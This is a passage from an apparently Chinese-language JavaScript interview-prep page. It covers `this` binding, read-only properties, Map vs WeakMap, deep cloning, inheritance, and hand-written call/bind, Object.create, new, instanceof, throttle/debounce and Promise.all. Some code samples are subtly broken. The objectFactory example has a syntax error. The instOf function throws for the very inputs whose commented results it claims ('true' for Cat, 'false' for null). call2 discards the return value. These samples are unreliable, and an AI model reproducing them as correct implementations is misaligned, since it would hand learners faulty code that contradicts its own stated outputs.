<span class="comment">// window，箭头函数绑定，this指向外层作用域，即全局作用域</span></span><br><span class="line"></span><br><span class="line">person1.<span class="title function_">show3</span>()(); <span class="comment">// window，默认绑定，这是一个高阶函数，调用者是window</span></span><br><span class="line"><span class="comment">// 类似于`var func = person1.show3()` 执行`func()`</span></span><br><span class="line">person1.<span class="title function_">show3</span>().<span class="title function_">call</span>(person2); <span class="comment">// person2，显式绑定，this指向 person2</span></span><br><span class="line">person1.<span class="property">show3</span>.<span class="title function_">call</span>(person2)(); <span class="comment">// window，默认绑定，调用者是window</span></span><br><span class="line"></span><br><span class="line">person1.<span class="title function_">show4</span>()(); <span class="comment">// person1，箭头函数绑定，this指向外层作用域，即person1函数作用域</span></span><br><span class="line">person1.<span class="title function_">show4</span>().<span class="title function_">call</span>(person2); <span class="comment">// person1，箭头函数绑定，</span></span><br><span class="line"><span class="comment">// this指向外层作用域，即person1函数作用域</span></span><br><span class="line">person1.<span class="property">show4</span>.<span class="title function_">call</span>(person2)(); <span class="comment">// person2</span></span><br></pre></td></tr></table></figure><h3 id="将一个对象的属性设置为一个只读的方式有哪些"><a href="#将一个对象的属性设置为一个只读的方式有哪些" class="headerlink" title="将一个对象的属性设置为一个只读的方式有哪些"></a>将一个对象的属性设置为一个只读的方式有哪些</h3><p>使用 <code>Object.defineProperty</code> 设置 <code>writeable</code></p><p>使用 <code>Object.freeze</code></p><p>使用对象的 <code>get</code></p><p>使用模块模式、闭包：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable constant_">CONFIG</span> = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> private = &#123;</span><br><span class="line">    <span class="attr">MY_CONST</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="attr">ANOTHER_CONST</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span> (<span class="params">name</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> private[name];</span><br><span class="line">    &#125;, <span class="comment">//函数返回一个对象，有get方法，接收name参数，返回内部私有变量的值</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(<span class="variable constant_">CONFIG</span>.<span class="title function_">get</span>(<span class="string">&quot;MY_CONST&quot;</span>)); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">CONFIG</span>.<span class="property">MY_CONST</span> = <span class="string">&quot;2&quot;</span>;</span><br><span class="line"><span class="title function_">alert</span>(<span class="variable constant_">CONFIG</span>.<span class="title function_">get</span>(<span class="string">&quot;MY_CONST&quot;</span>)); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">CONFIG</span>.<span class="property">private</span>.<span class="property">MY_CONST</span> = <span class="string">&quot;2&quot;</span>; <span class="comment">// 错误，没有private属性</span></span><br><span class="line"><span class="title function_">alert</span>(<span class="variable constant_">CONFIG</span>.<span class="title function_">get</span>(<span class="string">&quot;MY_CONST&quot;</span>)); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><h3 id="Map-和-WeakMap-的区别"><a href="#Map-和-WeakMap-的区别" class="headerlink" title="Map 和 WeakMap 的区别"></a>Map 和 WeakMap 的区别</h3><ul><li>Map 的键可以是任意类型，WeakMap 只接受对象作为键（null 除外），不接受其他类型的值作为键；</li><li>Map 的键实际上是跟内存地址绑定的，只要内存地址不一样，就视为两个键； WeakMap 的键是弱引用，键所指向的对象可以被垃圾回收，此时键是无效的；</li><li>Map 可以被遍历， WeakMap 不能被遍历，weakMap 没有 <code>keys</code> 和 <code>values</code> 的方法；</li></ul><p>Map 与 WeakMap 对内存回收的展现示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">map.<span class="title function_">set</span>(a, <span class="string">&quot;三分钟学前端&quot;</span>);</span><br><span class="line"></span><br><span class="line">a = <span class="literal">null</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="title function_">keys</span>()); <span class="comment">// MapIterator &#123;&#123;&#125;&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="title function_">values</span>()); <span class="comment">// MapIterator &#123;&quot;三分钟学前端&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// a 被置空了，但是 map 中还有对 `&#123;&#125;` 这个对象的引用，因此 `&#123;&#125;` 在内存中不会被释放，使用 map.keys() 时还能取到</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">WeakMap</span>();</span><br><span class="line">map.<span class="title function_">set</span>(a, <span class="string">&quot;三分钟学前端&quot;</span>);</span><br><span class="line">map.<span class="title function_">get</span>(a);</span><br><span class="line"></span><br><span class="line">a = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当 a 被置空后，WeakMap 中对 `&#123;&#125;` 的引用不会被 GC 标记为引用，因此 `&#123;&#125;` 会被回收，WeakMap 相应的也不会存储该值了</span></span><br></pre></td></tr></table></figure><h2 id="1-2-实现类"><a href="#1-2-实现类" class="headerlink" title="1.2 实现类"></a>1.2 实现类</h2><h3 id="实现一个类型判断的方法"><a href="#实现一个类型判断的方法" class="headerlink" title="实现一个类型判断的方法"></a>实现一个类型判断的方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getType</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> type = <span class="keyword">typeof</span> value;</span><br><span class="line">  <span class="comment">// 基本类型使用 typeof 的返回结果</span></span><br><span class="line">  <span class="keyword">if</span> (type !== <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> type;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果是 object 才能使用 prototype.toString 方法</span></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 引用类型通过正则匹配去掉前后多余字符</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span></span><br><span class="line">      .<span class="title function_">call</span>(value)</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="regexp">/^\[object (\S+)\]$/</span>, <span class="string">&quot;$1&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="如何实现一个深拷贝"><a href="#如何实现一个深拷贝" class="headerlink" title="如何实现一个深拷贝"></a>如何实现一个深拷贝</h3><p><a href="https://segmentfault.com/a/1190000020255831">参考文章</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isObject</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">typeof</span> obj === <span class="string">&quot;object&quot;</span> &amp;&amp; obj !== <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">deepClone</span>(<span class="params">obj, map = <span class="keyword">new</span> <span class="built_in">WeakMap</span>()</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_">isObject</span>(obj)) &#123;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 判断当前对象是否已经被拷贝过，防止循环引用</span></span><br><span class="line">  <span class="keyword">if</span> (map.<span class="title function_">has</span>(obj)) &#123;</span><br><span class="line">    <span class="keyword">return</span> map.<span class="title function_">get</span>(obj);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> newObj = <span class="title class_">Array</span>.<span class="title function_">isArray</span>(obj) ? [] : &#123;&#125;;</span><br><span class="line">  map.<span class="title function_">set</span>(obj, newObj);</span><br><span class="line">  [</span><br><span class="line">    ...<span class="title class_">Object</span>.<span class="title function_">keys</span>(obj),</span><br><span class="line">    <span class="comment">// Symbol 作为对象的 key 时，使用 for...in 和 Object.keys 都拿不到，必须使用 getOwnPropertySymbols 才能拿到</span></span><br><span class="line">    ...<span class="title class_">Object</span>.<span class="title function_">getOwnPropertySymbols</span>(obj),</span><br><span class="line">  ].<span class="title function_">forEach</span>(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> value = obj[key];</span><br><span class="line">    newObj[key] = <span class="title function_">isObject</span>(value) ? <span class="title function_">deepClone</span>(value, map) : value;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> newObj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点：</p><ul><li>深拷贝的意义</li><li>深拷贝与浅拷贝的区别</li><li><code>JSON.parse(JSON.stringify(obj))</code> 的缺陷 <a href="https://juejin.cn/post/6917509082844921869">参考</a></li><li>至少能够熟练实现对 Object、Array、null、undefined 这几种数据类型的拷贝，写出完整的拷贝方法是加分项</li></ul><h3 id="用-JS-实现一个继承"><a href="#用-JS-实现一个继承" class="headerlink" title="用 JS 实现一个继承"></a>用 JS 实现一个继承</h3><p><a href="https://blog.esunr.site/2024/01/9149c021f802.html">参考文章</a></p><p>重点：</p><ul><li>参考文章中的八种继承方案必须全部理解</li><li>熟练掌握寄生组合式继承</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * subInstance.__proto__ -&gt; SubClass.prototype</span></span><br><span class="line"><span class="comment"> * SubClass.prototype.__proto__ -&gt; SuperClass.prototype</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">inherit</span>(<span class="params">SubClass, SuperClass</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> parent = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">SuperClass</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> <span class="title class_">SubClass</span>.<span class="property"><span class="keyword">prototype</span></span>) &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(parent, key, &#123;</span><br><span class="line">      <span class="attr">value</span>: <span class="title class_">SubClass</span>.<span class="property"><span class="keyword">prototype</span></span>[key],</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title class_">SubClass</span>.<span class="property"><span class="keyword">prototype</span></span> = parent;</span><br><span class="line">  <span class="comment">// 修正 constructor</span></span><br><span class="line">  <span class="title class_">SubClass</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = <span class="title class_">SubClass</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Animal</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name || <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">eat</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ku ku&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Cat</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">  <span class="title class_">Animal</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, name);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span> = age || <span class="title class_">NaN</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Cat</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bark</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mew~&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">inherit</span>(<span class="title class_">Cat</span>, <span class="title class_">Animal</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;YiDianDian&quot;</span>, <span class="string">&quot;2 month&quot;</span>);</span><br><span class="line">cat.<span class="title function_">eat</span>();</span><br><span class="line">cat.<span class="title function_">bark</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: cat.<span class="property">name</span>,</span><br><span class="line">  <span class="attr">age</span>: cat.<span class="property">age</span>,</span><br><span class="line">&#125;); <span class="comment">// &#123; name: &#x27;YiDianDian&#x27;, age: &#x27;2 month&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=================&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat <span class="keyword">instanceof</span> <span class="title class_">Animal</span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat.<span class="property">constructor</span>); <span class="comment">// [Function: Cat]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cat.<span class="property">__proto__</span>.<span class="property">__proto__</span> === <span class="title class_">Animal</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Cat</span>.<span class="property">__proto__</span> === <span class="title class_">Animal</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h3 id="call-apply-bind-的实现"><a href="#call-apply-bind-的实现" class="headerlink" title="call apply bind 的实现"></a>call apply bind 的实现</h3><p><a href="https://github.com/mqyqingfeng/Blog/issues/11">参考文章</a></p><p>重点：</p><ul><li>先理解 call apply bind 的区别，然后再理解他们各自的使用场景，最后再去实现</li><li><code>bind</code> 方法在柯里化函数中的实践 <a href="https://zhuanlan.zhihu.com/p/31271179">参考</a></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">call2</span>(<span class="params">context, ...args</span>) &#123;</span><br><span class="line">  context = context || <span class="variable language_">window</span>;</span><br><span class="line">  <span class="comment">// 利用当前函数中的 this 指向为函数的调用者，来拿到 call2 的调用函数</span></span><br><span class="line">  context.<span class="property">fn</span> = <span class="variable language_">this</span>;</span><br><span class="line">  <span class="comment">// 再次利用函数的调用者是函数中的 this，来将 context 绑定到调用函数上</span></span><br><span class="line">  context.<span class="title function_">fn</span>(...args);</span><br><span class="line">  <span class="keyword">delete</span> context.<span class="property">fn</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">call2</span> = call2;</span><br><span class="line"></span><br><span class="line"><span class="comment">// apply 与 call2 类似，不再演示</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bind2</span>(<span class="params">context, ...bindArgs</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> self = <span class="variable language_">this</span>;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">bindFunc</span>(<span class="params">...args</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> fullArgs = [...bindArgs, ...args];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span> <span class="keyword">instanceof</span> bindFunc) &#123;</span><br><span class="line">      self.<span class="title function_">call2</span>(<span class="variable language_">this</span>, ...fullArgs);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      self.<span class="title function_">call2</span>(context, ...fullArgs);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  bindFunc.<span class="property"><span class="keyword">prototype</span></span> = self.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">  <span class="keyword">return</span> bindFunc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">bind2</span> = bind2;</span><br></pre></td></tr></table></figure><h3 id="实现-Object-create"><a href="#实现-Object-create" class="headerlink" title="实现 Object.create"></a>实现 Object.create</h3><p><code>Object.create</code> 会创建一个新的对象，并且将参数位的目标对象，与新创建的对象会进行原型链链接（newObject.__proto__ === targetObject）。</p><p>实现：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createObject</span>(<span class="params">proto</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Fn</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line">  <span class="title class_">Fn</span>.<span class="property"><span class="keyword">prototype</span></span> = proto;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Fn</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="实现-new-方法"><a href="#实现-new-方法" class="headerlink" title="实现 new 方法"></a>实现 new 方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">objectFactory</span>(<span class="params">constructor, ...args</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="title class_">Object</span>(),</span><br><span class="line">    obj.<span class="property">__proto__</span> = constructor.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">    <span class="comment">// 以上两步可以精简为：</span></span><br><span class="line">    <span class="comment">// var obj = Object.create(constructor.prototype);</span></span><br><span class="line">    <span class="keyword">var</span> ret = constructor.<span class="title function_">apply</span>(obj, args);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">typeof</span> ret === <span class="string">&#x27;object&#x27;</span> ? ret : obj;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="实现-instanceof"><a href="#实现-instanceof" class="headerlink" title="实现 instanceof"></a>实现 instanceof</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">instOf</span>(<span class="params">subInstance, parentConstructor</span>) &#123;</span><br><span class="line">  <span class="comment">// subInstance.__proto__ === parentConstructor.prototype</span></span><br><span class="line">  <span class="comment">// subInstance.__proto__.__proto__ === parentConstructor.prototype</span></span><br><span class="line">  <span class="comment">// __proto__ === null -&gt; exit</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> parentConstructor !== <span class="string">&quot;object&quot;</span> || parentConstructor === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;parentConstructor not an object&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> flag = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">let</span> chain = subInstance.<span class="property">__proto__</span>;</span><br><span class="line">  <span class="keyword">while</span> (!flag &amp;&amp; chain) &#123;</span><br><span class="line">    <span class="keyword">if</span> (chain === parentConstructor.<span class="property"><span class="keyword">prototype</span></span>) &#123;</span><br><span class="line">      flag = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      chain = chain.<span class="property">__proto__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">instOf</span>(cat, <span class="title class_">Cat</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">instOf</span>(cat, <span class="literal">null</span>)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h3 id="节流与防抖"><a href="#节流与防抖" class="headerlink" title="节流与防抖"></a>节流与防抖</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 节流</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">throttle</span>(<span class="params">fn, time</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> timer = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">...args</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!timer) &#123;</span><br><span class="line">      fn.<span class="title function_">call</span>(<span class="variable language_">this</span>, ...args);</span><br><span class="line">      timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        timer = <span class="literal">null</span>;</span><br><span class="line">      &#125;, time);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 防抖</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">fn, time</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> timer = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">...args</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (timer) &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(timer);</span><br><span class="line">    &#125;</span><br><span class="line">    timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      fn.<span class="title function_">call</span>(<span class="variable language_">this</span>, ...args);</span><br><span class="line">      timer = <span class="literal">null</span>;</span><br><span class="line">    &#125;, time);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>共同点：</p><ul><li>都需要使用闭包创建一个 <code>timer</code> 存放计时器</li><li>都在定时器执行完毕时才将 <code>timer</code> 置空</li></ul><p>不同点：</p><ul><li>在执行节流函数时如果检测到没有计时器就立即执行 fn，然而在执行防抖函数时是在定时器执行完毕后才执行 fn</li><li>节流函数不会去主动结束已有的定时器，而防抖函数在执行后总是会清除上一个定时器</li></ul><h3 id="Promise-各个静态方法实现"><a href="#Promise-各个静态方法实现" class="headerlink" title="Promise 各个静态方法实现"></a>Promise 各个静态方法实现</h3><p>Promise.all：Promise.all()方法接受一个数组为参数，数组中是 promise，如果数组中的 promise 都是 resolve 状态，那么 Promise.all()正常返回 resolve，返回的数据为一个数组，就是参数中每个 promise 的结果组成的数组。如果 promise.all()中任何一个是 reject，那么 promise.all()直接 reject。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  假设我们已经实现了_Promise</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property">_all</span> = <span class="function">(<span class="params">promiseList</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) 